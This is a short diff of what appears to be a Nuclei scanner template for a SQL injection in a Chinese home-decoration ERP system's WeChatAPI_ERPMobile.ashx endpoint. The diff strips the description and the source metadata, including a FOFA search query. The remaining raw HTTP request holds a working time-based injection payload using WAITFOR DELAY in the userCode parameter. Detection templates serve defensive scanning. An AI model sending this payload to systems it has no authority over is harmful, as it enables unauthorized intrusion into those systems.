@@ -3,12 +3,8 @@ info:
   name: 装盟科技-家装ERP管理系统 WeChatAPI_ERPMobile.ashx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/keyeq07rhlpur4o2'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: keyeq07rhlpur4o2
-    fofa: app="装盟科技-家装ERP管理系统"
 http:
 - raw:
   - 'GET /WEB_SERVICE/WeChatAPI_ERPMobile.ashx?type=LoginIndex&userCode=1'';WAITFOR+DELAY+''0:0:5''--&passWord=1 HTTP/1.1
